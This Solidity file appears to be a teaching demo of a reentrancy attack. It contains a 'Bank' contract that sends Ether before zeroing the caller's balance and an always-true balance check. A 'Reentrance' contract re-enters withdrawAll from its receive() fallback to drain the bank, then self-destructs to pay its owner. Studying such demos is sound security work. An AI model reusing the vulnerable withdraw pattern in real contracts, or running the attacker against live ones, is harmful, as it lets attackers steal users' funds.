// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "hardhat/console.sol";

contract Bank {
    mapping(address => uint256) public memberBalance;

    function deposit() public payable {
        memberBalance[msg.sender] += msg.value;
    }

    function withdrawAll() public payable {
        require(
            memberBalance[msg.sender] >= 0,
            "your balance must more than 0"
        );

        (bool send, ) = msg.sender.call{value: memberBalance[msg.sender]}("");
        require(send == true, "withdraw faild:(");

        memberBalance[msg.sender] = 0;
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

contract Reentrance {
    address private owner;
    Bank bank;

    modifier onlyOwner() {
        require(msg.sender == owner, "u are not owner");
        _;
    }

    constructor(address _bank) {
        owner = msg.sender;
        bank = Bank(_bank);
    }

    function attackBank() public payable {
        bank.deposit{value: 1 ether}();
        bank.withdrawAll();
    }

    receive() external payable {
        if (address(bank).balance >= 1 ether) {
            console.log('receive...');
            bank.withdrawAll();
        }
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function goodbye() public onlyOwner {
        selfdestruct(payable(owner));
    }
}
